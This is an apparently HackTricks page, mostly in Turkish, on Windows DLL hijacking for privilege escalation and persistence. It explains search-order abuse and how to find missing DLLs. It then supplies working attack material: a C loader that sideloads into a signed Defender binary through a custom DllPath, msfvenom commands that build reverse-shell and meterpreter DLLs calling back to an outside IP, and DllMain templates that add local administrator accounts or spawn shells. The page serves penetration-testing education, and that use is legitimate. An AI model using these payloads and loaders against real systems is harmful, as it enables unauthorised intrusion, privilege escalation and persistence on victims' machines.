# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Temel Bilgiler

DLL Hijacking, güvenilen bir uygulamanın kötü amaçlı bir DLL yüklemesi için manipüle edilmesini içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, kalıcılık sağlama ve daha az yaygın olarak ayrıcalık yükseltme için kullanılır. Burada odak noktası yükseltme olsa da, hijack yöntemi hedef ne olursa olsun aynıdır.

### Yaygın Teknikler

DLL hijack için uygulamanın DLL yükleme stratejisine bağlı olarak farklı etkinliklere sahip birkaç yöntem kullanılır:

1. **DLL Replacement**: Gerçek bir DLL'in kötü amaçlı olanla değiştirilmesi; isteğe bağlı olarak orijinal DLL işlevselliğini korumak için DLL Proxying kullanılır.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, uygulamanın arama modelini kötüye kullanarak meşru olandan önce aranacak bir yola yerleştirme.
3. **Phantom DLL Hijacking**: Uygulamanın, mevcut olmayan bir gereken DLL olduğunu düşünerek yükleyeceği kötü amaçlı bir DLL oluşturma.
4. **DLL Redirection**: Uygulamanın kötü amaçlı DLL'e yönlendirilmesi için %PATH% veya .exe.manifest / .exe.local dosyaları gibi arama parametrelerini değiştirme.
5. **WinSxS DLL Replacement**: Gerçek DLL'i WinSxS dizininde kötü amaçlı bir karşılıkla değiştirme; bu yöntem genellikle DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'i, kopyalanmış uygulama ile birlikte kullanıcı kontrollü bir dizine yerleştirerek Binary Proxy Execution tekniklerine benzeyen bir yaklaşım.

## Eksik Dll'leri Bulma

Bir sistemde eksik Dll'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **şağıdaki 2 filtreyi** **ayarlamaktır**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

ve sadece **File System Activity** gösterin:

![](<../../images/image (314).png>)

Eğer **genel olarak eksik dll'ler** arıyorsanız, bunu birkaç **saniye** çalışır bırakın.\
Eğer belirli bir yürütülebilir dosya içinde **eksik bir dll** arıyorsanız, **"Process Name" "contains" "\<exec name>"** gibi başka bir filtre ayarlayıp, onu çalıştırmalı ve olay yakalamayı durdurmalısınız.

## Eksik Dll'lerin İstismarı

Ayrıcalıkları yükseltmek için en iyi şansımız, ayrıcalıklı bir sürecin yüklemeye çalışacağı bir **dll yazabilmektir** ve bunu **dll'in aranacağı bazı yerlerden birine** yazabilmektir. Bu nedenle, dll'in orijinalinin bulunduğu klasörden **önce aranacağı** bir klasöre dll yazabilme (nadir durum), ya da dll'in herhangi bir klasörde orijinali bulunmadan aranacağı bir klasöre yazabilme şansımız olmalıdır.

### Dll Arama Sırası

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)** içinde Dll'lerin nasıl yüklendiğini spesifik olarak bulabilirsiniz.

Windows uygulamaları DLL'leri, önceden tanımlanmış bir dizi arama yolunu takip ederek ve belirli bir sıraya uyarak arar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesiyle ortaya çıkar; böylece meşru DLL'den önce yüklenmesi sağlanır. Bunu önlemenin bir çözümü, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

Aşağıda 32-bit sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın. (_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu elde eden bir fonksiyon yoktur ama aranmaktadır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın.
1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun, **App Paths** kayıt anahtarıyla belirtilen uygulama başına yol dahil olmadığını unutmayın. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkinleştirilmiş varsayılan arama sırasıdır. Bu özellik devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan olarak etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa, arama **LoadLibraryEx**'in yüklemekte olduğu yürütülebilir modülün dizininde başlar.

Son olarak, bir dll yalnızca adını belirterek değil mutlak yol belirterek de yüklenebilir. Bu durumda o dll **sadece belirtilen yolda aranacaktır** (eğer dll'in bağımlılıkları varsa, onlar sadece adla yüklenmiş gibi aranacaktır).

Arama sırasını değiştirebilecek başka yollar da vardır ancak onları burada açıklamayacağım.

### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading'i zorlamak

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, ntdll'in native API'leri ile süreci oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan kontrollü bir dizin vererek, hedef süreç bir DLL'i adla çözümlüyorsa (mutlak yol değil ve safe loading bayrakları kullanılmıyorsa), yükleyici o dizinden kötü amaçlı bir DLL yüklemeye zorlanabilir.

Temel fikir
- Süreç parametrelerini RtlCreateProcessParametersEx ile oluşturun ve kontrolünüzdeki klasöre işaret eden özel bir DllPath sağlayın (ör. dropper/unpacker'ınızın bulunduğu dizin).
- Süreci RtlCreateUserProcess ile oluşturun. Hedef ikili bir DLL'i adla çözümlerken, yükleyici çözümleme sırasında sağlanan bu DllPath'e başvuracak ve kötü amaçlı DLL hedef EXE ile aynı yerde olmasa bile güvenilir sideloading yapılmasına olanak verecektir.

Notlar/sınırlamalar
- Bu oluşturulan alt süreci etkiler; SetDllDirectory'den farklıdır, çünkü SetDllDirectory yalnızca mevcut süreci etkiler.
- Hedef, bir DLL'i adla import etmeli veya LoadLibrary ile adla yüklemelidir (mutlak yol olmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmamalıdır).
- KnownDLLs ve sabit (hardcoded) mutlak yollar hijack edilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C örneği (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Gereksinimler**:

- Farklı ayrıcalıklar (yatay veya lateral hareket) altında çalışan veya çalışacak ve **DLL eksikliği olan** bir süreci belirleyin.
- **DLL**'in aranacağı herhangi bir **dizin** için **yazma izninin** mevcut olduğundan emin olun. Bu konum yürütülebilir dosyanın dizini veya system path içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak zordur çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilirin DLL eksikliği olması tuhaftır** ve bir system path klasöründe **yazma iznine sahip olmak daha da tuhaftır** (varsayılan olarak sahip olamazsınız). Ancak yanlış yapılandırılmış ortamlarda bu mümkün olabilir.\
Eğer şanslıysanız ve gereksinimleri karşılıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC'i bypass etmek** olsa da, kullanabileceğiniz Windows sürümü için bir **PoC** of a Dll hijaking bulabilirsiniz (muhtemelen sadece yazma izniniz olan klasörün yolunu değiştirerek).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'ın imports'larını ve bir dll'in exports'larını şu şekilde kontrol edebilirsiniz:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Tam bir kılavuz için, yazma iznine sahip olduğunuz bir **System PATH klasöründe** **Dll Hijacking'i ayrıcalık yükseltmek için nasıl kötüye kullanacağınızı** görmek için şu kaynağa bakın:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sistem PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit fonksiyonları**dır: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Örnek

Eğer exploitable bir senaryo bulursanız, bunu başarılı şekilde sömürmenin en önemli unsurlarından biri, **en azından executable'ın ondan içe aktaracağı tüm fonksiyonları dışa aktaran bir dll oluşturmak** olacaktır. Her durumda, Dll Hijacking'in [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) veya [**High Integrity to SYSTEM**](#from-high-integrity-to-system) için kullanışlı olduğunu unutmayın. Geçerli bir dll'in **nasıl oluşturulacağına** dair bir örneği bu dll hijacking çalışmasında bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Ayrıca, **son bölü**mde bazı **temel dll kodları** bulabilirsiniz; bunlar **şablonlar** olarak veya **gerekmeyen fonksiyonları dışa aktaran bir dll** oluşturmak için faydalı olabilir.

## **Dll Oluşturma ve Derleme**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde **kötü amaçlı kodunuzu çalıştırabilen** ancak aynı zamanda **tüm çağrıları gerçek kütüphaneye ileterek** **beklendiği gibi çalışabilen** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla aslında **bir executable belirtebilir ve proxify etmek istediğiniz kütüphaneyi seçebilir**, ardından **bir proxified dll üretebilir** ya da **Dll'i belirterek** **bir proxified dll üretebilirsiniz**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) edinin:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluştur (x86 — x64 sürümünü görmedim):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Birçok durumda derlediğiniz Dll'in hedef süreç tarafından yüklenecek birkaç fonksiyonu **export several functions** sağlaması gerektiğini unutmayın; bu fonksiyonlar mevcut değilse **binary won't be able to load** ve **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referanslar

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
